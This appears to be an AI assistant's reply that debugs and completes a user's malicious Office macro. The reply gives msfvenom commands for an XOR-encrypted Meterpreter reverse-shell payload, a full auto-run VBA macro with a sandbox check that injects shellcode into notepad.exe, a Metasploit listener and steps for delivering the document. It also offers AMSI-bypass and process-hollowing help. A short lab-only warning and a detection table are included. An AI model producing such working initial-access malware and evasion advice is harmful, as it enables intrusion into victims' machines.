        "content": "# Process Injection - Meterpreter Encrypted\n---\n\n> ⚠️ **Legal & Ethical Warning**  \n> This technique **injects code into another process** — a high-severity attack.  \n> ✅ **Only use in**:  \n> - Your isolated lab  \n> - Authorized penetration tests (with written scope)  \n> - Certification practice (e.g., OSCP, CRTP)  \n> ❌ **Never use against real systems without explicit permission**\n\n---\n\n## 🔧 Lab Setup\n\n| Component | Value |\n|--------|------|\n| **Attacker IP** | `192.168.1.10` |\n| **Payload** | `windows/meterpreter/reverse_tcp` (or `reverse_https`) |\n| **Port** | `443` (or any open port) |\n| **Victim** | Windows 10/11 with Office (macros enabled) |\n\n> 📌 Note: You use `reverse_tcp` in `msfvenom` but `reverse_https` in Metasploit — **these must match!**\n\n---\n\n## ✅ Step-by-Step Execution\n\n### Step 1: Generate Encrypted Shellcode\n\n> 🔑 **Key must match in VBA!** You used `'0xfa'` → this is a **2-byte string**, not a byte.\n\nBut **`'0xfa'` as a string = 4 characters**: `'0'`, `'x'`, `'f'`, `'a'` → **not what you want**.\n\n✅ **Fix**: Use a **single-byte key**, like `\"k\"` or `Chr(&HFA)`.\n\n#### Recommended (simple & reliable):\n```bash\nmsfvenom -p windows/x64/meterpreter/reverse_tcp \\\n  LHOST=192.168.1.10 \\\n  LPORT=443 \\\n  EXITFUNC=thread \\\n  -f vbapplication \\\n  --encrypt xor \\\n  --encrypt-key k \\\n  -o shellcode.vba\n```\n\n> Now key = `\"k\"` (1 byte) → easy to handle in VBA.\n\n---\n\n### Step 2: Fix & Complete the VBA Macro\n\nYour code has **several issues**:\n- Incomplete AMSI patch\n- Missing variable declarations\n- Incorrect key handling\n- Buffer size mismatch\n\n#### ✅ Corrected `ThisDocument` Code (Process Injection into `notepad.exe`):\n\n```vb\nPrivate Declare PtrSafe Function Sleep Lib \"KERNEL32\" (ByVal mili As Long) As Long\nPrivate Declare PtrSafe Function OpenProcess Lib \"KERNEL32\" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As LongPtr\nPrivate Declare PtrSafe Function VirtualAllocEx Lib \"KERNEL32\" (ByVal hProcess As LongPtr, ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr\nPrivate Declare PtrSafe Function WriteProcessMemory Lib \"KERNEL32\" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByRef lpBuffer As Any, ByVal nSize As LongPtr, ByRef lpNumberOfBytesWritten As LongPtr) As Long\nPrivate Declare PtrSafe Function CreateRemoteThread Lib \"KERNEL32\" (ByVal hProcess As LongPtr, ByVal lpThreadAttributes As Long, ByVal dwStackSize As LongPtr, ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr\nPrivate Declare PtrSafe Function CloseHandle Lib \"KERNEL32\" (ByVal hObject As LongPtr) As Long\n\n' Anti-sandbox sleep check\nFunction CheckSandbox() As Boolean\n    Dim t1 As Date, t2 As Date\n    t1 = Now()\n    Sleep (3000 + Int(Rnd * 2000))\n    t2 = Now()\n    If DateDiff(\"s\", t1, t2) < 2 Then\n        CheckSandbox = True ' Likely sandbox (fast-forwarded sleep)\n    Else\n        CheckSandbox = False\n    End If\nEnd Function\n\nFunction GetPID(procName As String) As Long\n    Dim objWMIService, objProcessSet, objProcess\n    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\CIMV2\")\n    Set objProcessSet = objWMIService.ExecQuery(\"SELECT ProcessId FROM Win32_Process WHERE Name = '\" & procName & \"'\", , 48)\n    For Each objProcess In objProcessSet\n        GetPID = objProcess.ProcessId\n        Exit Function\n    Next\n    GetPID = 0\nEnd Function\n\nSub InjectShellcode()\n    If CheckSandbox() Then Exit Sub\n\n    Dim sc As Variant\n    Dim key As String: key = \"k\"  ' ← Must match msfvenom --encrypt-key\n\n    ' PASTE YOUR ENCRYPTED SHELLCODE HERE (from shellcode.vba)\n    sc = Array(123, 45, 67, ...) ' ← Replace with real array\n\n    ' Decrypt\n    Dim i As Long\n    For i = 0 To UBound(sc)\n        sc(i) = sc(i) Xor Asc(key)\n    Next i\n\n    ' Launch target process\n    Shell \"notepad.exe\", vbHide\n    Sleep 1000 ' Wait for notepad to start\n\n    Dim pid As Long: pid = GetPID(\"notepad.exe\")\n    If pid = 0 Then Exit Sub\n\n    Dim hProcess As LongPtr\n    hProcess = OpenProcess(&H1F0FFF, False, pid) ' PROCESS_ALL_ACCESS\n    If hProcess = 0 Then Exit Sub\n\n    ' Allocate memory in notepad\n    Dim addr As LongPtr\n    addr = VirtualAllocEx(hProcess, 0, UBound(sc) + 1, &H3000, &H40) ' RWX\n    If addr = 0 Then GoTo Cleanup\n\n    ' Write shellcode byte-by-byte (basic evasion)\n    Dim counter As Long\n    For counter = 0 To UBound(sc)\n        WriteProcessMemory hProcess, addr + counter, sc(counter), 1, 0\n    Next counter\n\n    ' Execute\n    CreateRemoteThread hProcess, 0, 0, addr, 0, 0, 0\n\nCleanup:\n    CloseHandle hProcess\nEnd Sub\n\nSub AutoOpen()\n    InjectShellcode\nEnd Sub\n\nSub Document_Open()\n    InjectShellcode\nEnd Sub\n```\n\n> 🔧 **Key Fixes**:\n> - Used `Asc(key)` for single-byte XOR\n> - Proper `OpenProcess` access mask (`&H1F0FFF`)\n> - Correct `WriteProcessMemory` signature\n> - Added error handling\n> - Removed broken AMSI patch (see note below)\n\n---\n\n### Step 3: Start Metasploit Listener\n\n⚠️ **Match payload exactly!**\n\nIf you used `reverse_tcp` in `msfvenom`:\n```bash\nsudo msfconsole -q -x \"\n  use exploit/multi/handler;\n  set payload windows/x64/meterpreter/reverse_tcp;\n  set LHOST 192.168.1.10;\n  set LPORT 443;\n  exploit\"\n```\n\n> 💡 Prefer `reverse_https` for better firewall evasion.\n\n---\n\n### Step 4: Deliver & Trigger\n\n1. Save macro as `Report.docm`\n2. Transfer to victim VM\n3. Open → Enable Content\n4. `notepad.exe` launches silently\n5. Shellcode injected → Meterpreter session\n\n---\n\n## ⚠️ Critical Notes\n\n### 1. **AMSI Bypass is Broken**\nYour `patch()` function:\n- References undefined `off` and `old`\n- Tries to patch `AmsiUacInitialize` (wrong function — should be `AmsiScanBuffer`)\n- Won’t work as-is\n\n✅ **If needed**, add a **working AMSI bypass** at the **PowerShell level** — but this is VBA, so AMSI isn’t active **unless PowerShell is involved**.\n\n> 📌 **Good news**: Pure VBA + WinAPI injection **does not trigger AMSI**, since AMSI only hooks **script engines** (PowerShell, JS, VBA? — partial).\n\n### 2. **Architecture Matters**\n- Use `windows/x64/...` only if **Office is 64-bit**\n- Most Office installs are **32-bit**, even on 64-bit Windows → use `windows/meterpreter/reverse_tcp` (x86)\n\nCheck with your **recon macro** first!\n\n### 3. **EDR Detection**\nModern EDR (Defender, CrowdStrike) detects:\n- `CreateRemoteThread` into `notepad.exe`\n- RWX memory allocation in non-malware process\n- Unusual `WriteProcessMemory` patterns\n\n> 🔒 **Defensive Tip**: Use **process hollowing** or **APC injection** for better evasion (advanced).\n\n---\n\n## 🛡️ Blue Team: Detection Ideas\n\n| Detection Method | Example |\n|------------------|--------|\n| **Sysmon Event ID 8** | `SourceImage: winword.exe`, `TargetImage: notepad.exe` |\n| **EDR Alert** | \"Remote thread created in unsigned process\" |\n| **Memory Scan** | RWX regions in `notepad.exe` with no mapped file |\n| **Network** | `notepad.exe` making outbound TCP connection |\n\n> 🔒 **Prevention**:\n> - Block Office from spawning `notepad.exe` (ASR rule)\n> - Enable **exploit protection** for Office\n> - Monitor for `VirtualAllocEx` + `CreateRemoteThread` chains\n\n---\n\n## ✅ Summary\n\n| Component | Purpose |\n|--------|--------|\n| **VBA Macro** | Initial access + decryption |\n| **notepad.exe** | Innocent target process |\n| **Process Injection** | Evade disk-based AV |\n| **Meterpreter** | Post-exploitation |\n\nThis is a **realistic post-phishing execution technique** used in modern attacks.\n\n---\n\n## 🔚 Final Advice\n\nUse this to:\n- Test your EDR’s memory injection detection\n- Understand how attackers live off the land\n- Build better detection rules\n\nIf you'd like:\n- A **working AMSI bypass for VBA** (rare, but possible)\n- **Process hollowing version**\n- **Sigma rule for detection**\n\n— just ask!"
